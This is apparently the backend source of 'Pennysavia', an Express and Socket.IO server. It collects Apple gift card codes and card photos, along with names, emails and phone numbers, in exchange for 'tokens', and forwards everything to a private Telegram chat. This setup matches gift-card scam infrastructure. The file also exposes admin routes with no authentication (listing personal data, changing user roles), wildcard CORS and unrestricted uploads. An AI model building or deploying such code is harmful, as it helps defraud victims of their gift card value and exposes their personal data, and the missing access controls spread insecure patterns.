const express = require('express')
const cors = require('cors')
const axios = require('axios')
const FormData = require('form-data')
const multer = require('multer')
const fs = require('fs')
const path = require('path')
const http = require('http')
const { Server } = require('socket.io')
require('dotenv').config()

const app = express()
const server = http.createServer(app)
const io = new Server(server, {
  cors: { origin: '*' }
})

app.use(cors())
app.use(express.json({ limit: '20mb' }))

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('Warning: TELEGRAM_BOT_TOKEN or TELEGRAM_ADMIN_CHAT_ID not set. Set them in .env for Telegram forwarding to work.')
}

// Ensure uploads directory exists
const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads')
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true })

// Multer setup for handling media uploads (images, audio)
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOAD_DIR),
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname) || ''
    cb(null, `${Date.now()}-${Math.random().toString(36).slice(2,8)}${ext}`)
  }
})
const upload = multer({ storage, limits: { fileSize: 25 * 1024 * 1024 } }) // 25MB limit

// In-memory storage for demo (use DB in production)
let submissions = []
let users = []
let messages = []

app.get('/', (req, res) => {
  res.json({ ok: true, message: 'Pennysavia backend running' })
})

// serve uploaded files
app.use('/uploads', express.static(path.join(__dirname, 'public', 'uploads')))

app.post('/api/send-telegram', async (req, res) => {
  try {
    if (!BOT_TOKEN || !CHAT_ID) return res.status(500).json({ error: 'Server not configured with TELEGRAM_BOT_TOKEN/TELEGRAM_ADMIN_CHAT_ID' })

    const { images, code } = req.body || {}
    if (!images || !Array.isArray(images) || images.length < 1) {
      return res.status(400).json({ error: 'No images provided' })
    }

    // Send a text message first with the code
    const messageText = `🎁 New Apple gift card submission:\n💾 Code: ${code}\n📷 Images: ${images.length} file(s)`
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: messageText
    })

    // Send each image as a photo
    for (let i = 0; i < images.length; i++) {
      const b64 = images[i]
      // strip data url prefix if present
      const parts = b64.split(',')
      const dataPart = parts.length > 1 ? parts[1] : parts[0]
      const buffer = Buffer.from(dataPart, 'base64')

      const form = new FormData()
      form.append('chat_id', CHAT_ID)
      form.append('photo', buffer, { filename: `gift-card-${Date.now()}-${i}.jpg` })

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
        headers: form.getHeaders(),
        maxContentLength: Infinity,
        maxBodyLength: Infinity
      })
    }

    return res.json({ ok: true })
  } catch (err) {
    console.error('Telegram send error', err?.response?.data || err.message || err)
    return res.status(500).json({ error: 'Failed to forward to Telegram' })
  }
})

app.post('/api/submit-giftcard', async (req, res) => {
  try {
    const { fullName, email, phone, amount, images, userId, userName } = req.body
    
    if (!fullName || !email || !phone || !amount || !images || images.length < 2) {
      return res.status(400).json({ error: 'Missing required fields' })
    }

    const submission = {
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      fullName,
      email,
      phone,
      amount,
      userId,
      userName,
      status: 'pending',
      images
    }

    submissions.push(submission)

    // Send to Telegram
    if (BOT_TOKEN && CHAT_ID) {
      try {
        const messageText = `
🎁 **NEW GIFT CARD SUBMISSION**
👤 Name: ${fullName}
📧 Email: ${email}
📱 Phone: ${phone}
💰 Amount: $${amount}
🪙 Tokens: ${Math.floor(amount / 50)}
🆔 User ID: ${userId}
⏰ Timestamp: ${new Date().toLocaleString()}
        `.trim()

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: CHAT_ID,
          text: messageText,
          parse_mode: 'Markdown'
        })

        // Send images
        for (let i = 0; i < images.length; i++) {
          const b64 = images[i]
          const parts = b64.split(',')
          const dataPart = parts.length > 1 ? parts[1] : parts[0]
          const buffer = Buffer.from(dataPart, 'base64')

          const form = new FormData()
          form.append('chat_id', CHAT_ID)
          form.append('photo', buffer, { filename: `giftcard-${submission.id}-${i}.jpg` })

          await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity
          })
        }
      } catch (tgErr) {
        console.error('Telegram notification error:', tgErr.message)
        // Continue even if Telegram fails
      }
    }

    return res.json({ 
      ok: true, 
      message: 'Gift card submission received',
      submissionId: submission.id
    })
  } catch (err) {
    console.error('Submit giftcard error:', err.message)
    return res.status(500).json({ error: 'Failed to submit gift card' })
  }
})

app.post('/api/submit-dwt-purchase', async (req, res) => {
  try {
    const { name, email, phone, amount, price, image, userId } = req.body
    
    if (!name || !email || !phone || !amount || !price || !image) {
      return res.status(400).json({ error: 'Missing required fields' })
    }

    const submission = {
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      type: 'dwt-purchase',
      name,
      email,
      phone,
      amount,
      price,
      userId,
      image,
      status: 'pending'
    }

    submissions.push(submission)

    // Send to Telegram
    if (BOT_TOKEN && CHAT_ID) {
      try {
        const messageText = `
🪙 **NEW DWT PURCHASE REQUEST**
👤 Name: ${name}
📧 Email: ${email}
📱 Phone: ${phone}
💵 Amount: ${amount} DWT
💰 Price: $${price.toFixed(2)}
🆔 User ID: ${userId}
⏰ Timestamp: ${new Date().toLocaleString()}
        `.trim()

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: CHAT_ID,
          text: messageText,
          parse_mode: 'Markdown'
        })

        // Send payment proof image
        if (image && image.startsWith('http')) {
          // If it's a URL from /uploads
          await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            chat_id: CHAT_ID,
            photo: image,
            caption: `Payment Proof for ${amount} DWT`
          })
        }
      } catch (tgErr) {
        console.error('Telegram notification error:', tgErr.message)
        // Continue even if Telegram fails
      }
    }

    return res.json({ 
      ok: true, 
      message: 'DWT purchase request submitted',
      submissionId: submission.id
    })
  } catch (err) {
    console.error('Submit DWT purchase error:', err.message)
    return res.status(500).json({ error: 'Failed to submit DWT purchase request' })
  }
})

app.get('/api/admin/submissions', (req, res) => {
  // Demo: no auth required for now — add auth in production
  return res.json({ submissions })
})

app.patch('/api/admin/submissions/:id', (req, res) => {
  const { id } = req.params
  const { status } = req.body

  const submission = submissions.find(s => s.id === id)
  if (!submission) {
    return res.status(404).json({ error: 'Submission not found' })
  }

  submission.status = status // 'approved', 'rejected', etc.
  return res.json({ ok: true, submission })
})

// Admin: list users
app.get('/api/admin/users', (req, res) => {
  return res.json({ users })
})

// Admin: update user (role / banned)
app.patch('/api/admin/users/:id', (req, res) => {
  const { id } = req.params
  const { role, banned } = req.body
  const user = users.find(u => u.id === id)
  if (!user) return res.status(404).json({ error: 'User not found' })
  if (role) user.role = role
  if (typeof banned === 'boolean') user.banned = banned
  return res.json({ ok: true, user })
})

// Admin: send message to user (server-side route for admin tooling)
app.post('/api/admin/message', (req, res) => {
  const { toUserId, fromUser, text } = req.body
  if (!toUserId || !text) return res.status(400).json({ error: 'Missing toUserId or text' })
  const room = `user:${toUserId}`
  const msg = { id: Date.now().toString(), type: 'text', room, user: fromUser || { userName: 'Admin' }, text, timestamp: Date.now(), private: true }
  messages.push(msg)
  io.to(room).emit('chatMessage', msg)
  return res.json({ ok: true, msg })
})

// Upload endpoint for chat media (images, voice notes)
app.post('/api/upload', upload.single('file'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' })
  const url = `/uploads/${req.file.filename}`
  return res.json({ ok: true, url })
})

// Messages persistence endpoint (simple)
app.get('/api/messages', (req, res) => {
  return res.json({ messages })
})

// Socket.IO chat handling
io.on('connection', socket => {
  console.log('socket connected', socket.id)

  socket.on('joinRoom', ({ room, user }) => {
    // Join the general room and also a user-specific room if user.id provided
    socket.join(room)
    if (user && user.id) socket.join(`user:${user.id}`)
    socket.data.user = user
    socket.to(room).emit('systemMessage', { text: `${user?.userName || 'User'} joined the room`, timestamp: Date.now() })
  })

  socket.on('leaveRoom', ({ room, user }) => {
    socket.leave(room)
    socket.to(room).emit('systemMessage', { text: `${user?.userName || 'User'} left the room`, timestamp: Date.now() })
  })

  socket.on('chatMessage', (payload) => {
    // payload: { room, user, text }
    const msg = { id: Date.now().toString(), type: 'text', ...payload, timestamp: Date.now() }
    messages.push(msg)
    io.to(payload.room).emit('chatMessage', msg)
  })

  socket.on('chatMedia', (payload) => {
    // payload: { room, user, url, mediaType }
    const msg = { id: Date.now().toString(), type: payload.mediaType || 'media', ...payload, timestamp: Date.now() }
    messages.push(msg)
    io.to(payload.room).emit('chatMessage', msg)
  })

  // Admin-private: allow server to notify a specific user by emitting to their user room
  socket.on('privateMessage', (payload) => {
    // payload: { toUserId, fromUser, text }
    const room = `user:${payload.toUserId}`
    const msg = { id: Date.now().toString(), type: 'text', room, user: payload.fromUser, text: payload.text, timestamp: Date.now(), private: true }
    messages.push(msg)
    io.to(room).emit('chatMessage', msg)
  })

  socket.on('disconnect', () => {
    // optional: broadcast disconnect
  })
})

const PORT = process.env.PORT || 4000
server.listen(PORT, () => {
  console.log(`✅ Pennysavia backend listening on port ${PORT}`)
})
